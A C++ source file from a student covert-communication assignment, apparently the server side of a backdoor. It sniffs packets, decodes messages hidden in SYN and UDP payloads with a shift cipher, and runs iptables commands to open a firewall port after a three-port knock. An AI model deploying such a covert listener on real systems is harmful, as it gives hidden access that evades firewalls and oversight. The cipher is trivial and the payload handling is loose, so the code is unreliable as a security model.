/*******************************************************************************
**
**  Author:   Mario Enriquez,   A00909441
**  Class:    COMP_8505
**  Title:    Final Assignment, Covert Communication
**
**  Notes:
**        -Based on the code from Rowland and Aman Abdullah
**
*******************************************************************************/
#include "headers.h"

string exec(char*);

int knock_flags[3]={0,0,0};

std::string decr_encr(std::string msg)
{
    // Shift encryption
    string::size_type i;

    // And now for the encryption part
    for (i = 0; i < msg.length(); i++)
        msg[i] -= 10;
    return msg;
}

std::string encr_decr(std::string msg)
{
    // Shift encryption
    string::size_type i;

    // And now for the encryption part
    for (i = 0; i < msg.length(); i++)
        msg[i] += 10;
    return msg;
}

u_int16_t handle_ethernet (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet){
  u_int caplen = pkthdr->caplen;
  u_int length = pkthdr->len;
  struct ether_header *eptr;  /* net/ethernet.h */
  u_short ether_type;

  if (caplen < ETHER_HDRLEN){
  	cout << "Packet length less than ethernet header length" << endl;
  	return -1;
  }

  // Start with the Ethernet header...
  eptr = (struct ether_header *) packet;
  ether_type = ntohs(eptr->ether_type);

  return ether_type;
}

// This function will parse the IP header and print out selected fields of interest
void handle_IP (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet,int ports[], int ip_id)
{
  const struct my_ip* ip;
  u_int length = pkthdr->len;
  u_int hlen,off,version;
  int len;

  // Jump past the Ethernet header
  ip = (struct my_ip*)(packet + sizeof(struct ether_header));
  length -= sizeof(struct ether_header);

  // make sure that the packet is of a valid length
  if (length < sizeof(struct my_ip)){
    	cout << "Truncated IP " << length;
    	exit (1);
  }

  len     = ntohs(ip->ip_len);
  hlen    = IP_HL(ip); 	// get header length
  version = IP_V(ip);	// get the IP version number

  // verify version
  if(version != 4){
    cout << "Unknown version " << version << endl;
    exit (1);
  }

  // verify the header length */
  if(hlen < 5 ){
    cout << "Bad header length " << hlen << endl;
  }

  // Ensure that we have as much of the packet as we should
  if (length < len)
    cout << "Truncated IP " << (len -length) <<" - bytes missing\n" << endl;

  // Ensure that the first fragment is present
  off = ntohs(ip->ip_off);

  switch (ip->ip_p){
    case IPPROTO_TCP:
		  handle_TCP (args, pkthdr, packet, ports, ip_id);
      break;
    case IPPROTO_UDP:
      //cout << "   Protocol: UDP" << endl;
      handle_UDP (args, pkthdr, packet, ports, ip_id);
      break;
    default:
      //cout << "   Protocol: unknown" << endl;
      break;
  }
}

// This function will parse the IP header and print out selected fields of interest
void handle_TCP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet, int ports[], int ip_id){
	const struct sniff_tcp *tcp=0;          // The TCP header
	const struct my_ip *ip;              	// The IP header
  u_char *payload;                    // Packet payload
  u_short dport,sport;
  string buffer;
  string decrypt;
  short urg,ack,psh,rst,syn,fin,aux;
  string iptable_accept=" iptables -A INPUT -p tcp --dport " + std::to_string(ports[5]) +" -j ACCEPT";
  string iptable_drop=" iptables -D INPUT -p tcp --dport " + std::to_string(ports[5]) +" -j ACCEPT";

  int size_ip;
  int size_tcp;
  int size_payload;

  ip = (struct my_ip*)(packet + SIZE_ETHERNET);
  size_ip = IP_HL (ip)*4;

  // define/compute tcp header offset
  tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
  size_tcp = TH_OFF(tcp)*4;

  dport=ntohs(tcp->th_dport);
  sport=ntohs(tcp->th_sport);
  for(int i = 7; 0 <= i; i --){
    aux=((tcp->th_flags >> i) & 0x01);
    switch(i){
      case 5:
        urg=aux;
        break;
      case 4:
        ack=aux;
        break;
      case 3:
        psh=aux;
        break;
      case 2:
        rst=aux;
        break;
      case 1:
        syn=aux;
        break;
      case 0:
        fin=aux;
        break;
      default:
        break;
    }
  }
  if (size_tcp < 20){
    cout << "   * Control Packet? length: " << size_tcp << " bytes\n" << endl;
    exit(1);
  }

  // define/compute tcp payload (segment) offset
  payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);

  // compute tcp payload (segment) size
  size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

  if(syn==1 && (urg+ack+psh+rst+fin)==0){
    if(dport==ports[1]){
      // Print payload data, including binary translation
      if (size_payload > 0){
        buffer = reinterpret_cast<char*>(payload);
        decrypt = decr_encr(buffer);
        cout <<  decrypt;
      }
    }
  } else if(ack == 1 && psh == 1 && (urg+syn+rst+fin)==0){
    if(dport==ports[2]){ //Checks if port knock is first if not resets
      if(knock_flags[0]==0 && knock_flags[1]==0 && knock_flags[2]==0){
        knock_flags[0]=1;
        cout << "Knock on port: " << ports[2] << endl;
      } else {
        knock_flags[0]=0;
        knock_flags[1]=0;
        knock_flags[2]=0;
        exec((char *)iptable_drop.c_str());
      }
    } else if (dport==ports[3]){ //Checks if port knock is second if not resets
      if(knock_flags[0]==1 && knock_flags[1]==0 && knock_flags[2]==0){
        knock_flags[1]=1;
        cout << "Knock on port: " << ports[3] << endl;
      } else {
        knock_flags[0]=0;
        knock_flags[1]=0;
        knock_flags[2]=0;
        exec((char *)iptable_drop.c_str());
      }
    } else if (dport==ports[4]){//Checks if port knock is third if not resets
      if(knock_flags[0]==1 && knock_flags[1]==1 && knock_flags[2]==0){
        knock_flags[2]=1;
        cout << "Knock on port: " << ports[4] << endl;
      } else {
        knock_flags[0]=0;
        knock_flags[1]=0;
        knock_flags[2]=0;
        exec((char *)iptable_drop.c_str());
      }
    } else { // resets if unknown
      knock_flags[0]=0;
      knock_flags[1]=0;
      knock_flags[2]=0;
      exec((char *)iptable_drop.c_str());
    }
    cout << "Knocks: " << knock_flags[0] << knock_flags[1] << knock_flags[2] << endl;
    if(knock_flags[0] == 1 && knock_flags[1] == 1 && knock_flags[2] == 1){
      exec((char *)iptable_accept.c_str());
    }
  }


}

void handle_UDP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet, int ports[], int ip_id){
  const struct sniff_udp *udp=0;          // The UDP header
	const struct my_ip *ip;              	// The IP header
  u_char *payload;                    // Packet payload
  string command_res,buffer,enc_buff,dec_payload;
  int index=0;
  int i;
  int size_ip;
  int size_udp;
  int size_payload;
  int flags[6] = {0,1,0,0,0,0};
  u_short dport,sport;
  string decrypt;

  ip = (struct my_ip*)(packet + SIZE_ETHERNET);
  size_ip = IP_HL (ip)*4;

  // define/compute UDP header offset
  udp = (struct sniff_udp*)(packet + SIZE_ETHERNET + size_ip);
  size_udp = 8;

  if (size_udp < 8){
    cout << "   * Control Packet? length: " << size_udp << " bytes\n" << endl;
    exit(1);
  }
  dport=ntohs(udp->th_dport);

  // define/compute UDP payload (segment) offset
  payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_udp);

  // compute UDP payload (segment) size
  size_payload = ntohs(ip->ip_len) - (size_ip + size_udp);

  if(dport==ports[1]){
    // Print payload data, including binary translation
    if (size_payload > 0){
      buffer = reinterpret_cast<char*>(payload);
      decrypt = decr_encr(buffer);
      cout <<  decrypt;
    }
  }
}
